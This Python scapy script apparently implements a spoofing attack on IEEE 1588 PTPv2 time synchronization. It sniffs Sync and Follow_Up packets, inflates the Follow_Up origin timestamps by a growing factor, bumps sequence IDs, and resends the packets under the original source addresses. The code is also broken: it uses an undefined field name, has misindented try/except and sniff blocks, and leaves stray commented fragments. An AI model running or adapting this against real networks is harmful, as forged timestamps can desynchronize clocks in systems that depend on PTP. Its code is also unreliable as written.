from scapy.all import *
from scapy.fields import BitEnumField, BitField, ByteField, ConditionalField, FlagsField, \
        LongField, ShortField, SignedByteField, XBitField, XByteField, XIntField, XStrFixedLenField
from scapy.layers.l2 import Ether
from scapy.packet import Packet

from fields import PortIdentityField, TimestampField
from scapy.all import *
#-------------------------------------------#

import random

# We used the class : IEEE588 to disect the packets using the code from this repo: https://github.com/weinshec/scapy-gptp.git
class IEEE588(Packet):
    name = "PTPv2"

    MSG_TYPES = {
        0x0: "Sync",
        0x2: "PdelayReqest",
        0x3: "PdelayResponse",
        0x8: "FollowUp",
        0xA: "PdelayResponseFollowUp",
        0xb: "Announce" 
    }

    FLAGS = [
        "LI61", "LI59", "UTC_REASONABLE", "TIMESCALE",
        "TIME_TRACEABLE", "FREQUENCY_TRACEABLE", "SYNCHRONIZATION_UNCERTAIN", "?",
        "ALTERNATE_MASTER", "TWO_STEP", "UNICAST", "?",
        "?", "profileSpecific1", "profileSpecific2", "SECURITY",
    ]

    fields_desc = [
        BitField("transportSpecific", 1, 4),
        BitEnumField("messageType", 0, 4, MSG_TYPES),
        XBitField("reserved0", 0, 4),
        BitField("versionPTP", 0x2, 4),
        ShortField("messageLength", 34),
        ByteField("domainNumber", 0),
        XByteField("reserved1", 0),
        FlagsField("flags", 0, 16, FLAGS),
        LongField("correctionField", 0),
        XIntField("reserved2", 0),
        PortIdentityField("sourcePortIdentity", 0),
        ShortField("sequenceId", 0),
        XByteField("control", 0),
        SignedByteField("logMessageInterval", -3),

        # Sync
        # ConditionalField(BitField("reserved3", 0, 80), lambda pkt: pkt.is_sync),
        # ConditionalField(BitField(""))

        # Announce
        ConditionalField(cL("preciseOriginTimestamp", 0), lambda pkt: pkt.is_followup),

        # ConditionalField(),

        # FollowUp
        
        ConditionalField(TimestampField("preciseOriginTimestamp", 0), lambda pkt: pkt.is_followup),
        ConditionalField(XStrFixedLenField("informationTlv", 0, 32), lambda pkt: pkt.is_followup),
        ConditionalField(XStrFixedLenField("ClockIdentity", 0,64), lambda pkt: pkt.is_followup),


        # PdelayReq
        ConditionalField(BitField("reserved4", 0, 80), lambda pkt: pkt.is_pdelay_req),
        ConditionalField(BitField("reserved5", 0, 80), lambda pkt: pkt.is_pdelay_req),

        # PdelayResp
        ConditionalField(
            TimestampField("requestReceiptTimestamp", 0),
            lambda pkt: pkt.is_pdelay_resp),

        # PdelayRespFollowUp
        ConditionalField(
            TimestampField("responseOriginTimestamp", 0),
            lambda pkt:pkt.is_pdelay_resp_followup),

        ConditionalField(
            PortIdentityField("requestingPortIdentity", 0),
            lambda pkt: pkt.is_pdelay_resp or pkt.is_pdelay_resp_followup),
    ]

    @property
    def is_sync(self):
        return(self.messageType == 0x0)

    @property
    def is_followup(self):
        return(self.messageType == 0x8)

    @property
    def is_pdelay_req(self):
        return(self.messageType == 0x2)

    @property
    def is_pdelay_resp(self):
        return(self.messageType == 0x3)

    @property
    def is_pdelay_resp_followup(self):
        return(self.messageType == 0xA)

    def extract_padding(self, s):
        return "", s


packet_count = {"0x0":0,"0x8":0,"0xb":0,"0x1":0,'0x9':0}
def dissect_and_resend_ptpv2(packet): #This function takes in the packet to disect it and resend.
    # print("Packet received:", packet.show())
    if 'UDP' in packet and 'IP' in packet and Raw in packet:
        try:
            ptp_payload = packet[Raw].load
            ptp_packet = IEEE588(ptp_payload) 
 
            if ptp_packet.messageType == 0x0:
                packet_count['0x0'] +=1
                print("found A Sync message:")
            
                #ptp_packet.preciseoriginTimestamp = 0.0
                # ptp_packet.originTimestamp = 100
                # ptp_packet.messageType = 0x8
               
                ptp_packet.sequenceId +=1

                
     
            elif ptp_packet.messageType == 0x8:
                packet_count['0x8'] += 1
                print("found A Follow_Up message:")
                time_before = ptp_packet.preciseOriginTimestamp
                fraction = 1 + (packet_count['0x8']*0.5) 
                ptp_packet.preciseOriginTimestamp = time_before*fraction 
                # ptp_packet.messageType = 0x0
                ptp_packet.sequenceId +=1
                ptp_packetSend = (bytes(ptp_packet)).rstrip(b'\x00')

                 
                
            
            elif ptp_packet.messageType == 0xb:
                packet_count['0xb'] +=1

            elif ptp_packet.messageType == 0x1:
                packet_count['0x1'] +=1
            
            elif ptp_packet.messageType == 0x9:
                packet_count['0x9'] +=1


            
            
            

            
                                
            
                
                # ptp_packet.show()
                # -----------------------------------------------------------------------------------------------------                                
            print("\nPTPv2 Fields:")
                # print(f"After:{timeStamp_after}, with the precentage of %")
                # if timeStamp_after != timeStamp_before: # Before sending the packet back in the network we check if the field has been changed.
                #     print("DAGS ATT SKICKA")
            ptp_packet.show()
                    # Here prepare the packet to resend back in the network!
            ptp_packet_sending2 = IP(src=packet['IP'].src, dst=packet['IP'].dst) / \
                                      UDP(sport=319 if ptp_packet.messageType == 0x0 else 320, dport=319 if ptp_packet.messageType == 0x0 else 320) / \
                                      Raw(bytes(ptp_packet))
            


            # if ptp_packet.messageType == 0x0:
            #     ptp_packet_sending2 = IP(src=packet['IP'].src, dst=packet['IP'].dst) / \
            #         UDP(sport=319, dport=319) / \
            #             Raw(ptp_packet)
            # else: 
            #     # ptp_packetSend = (bytes(ptp_packet)).rstrip(b'\x00')
            #     ptp_packet_sending2 = IP(src=packet['IP'].src, dst=packet['IP'].dst) / \
            #             UDP(sport=320, dport=320) / \
            #                 Raw(ptp_packetSend)
                    


        send(ptp_packet_sending2, iface="enp1s0")
        print("----------------------------------")
        print("Packet sent successfully")
       
        except struct.error:
            print("Packet discarded due to struct.error")
        except Exception as e:
            print("An error occurred:", e)
                                              

# Sniff packets and dissect PTPv2 packets

    pkts = sniff(filter="udp and (port 319 or port 320)", prn=dissect_and_resend_ptpv2, count=60)

    print(f"Number of packets captured:{packet_count}")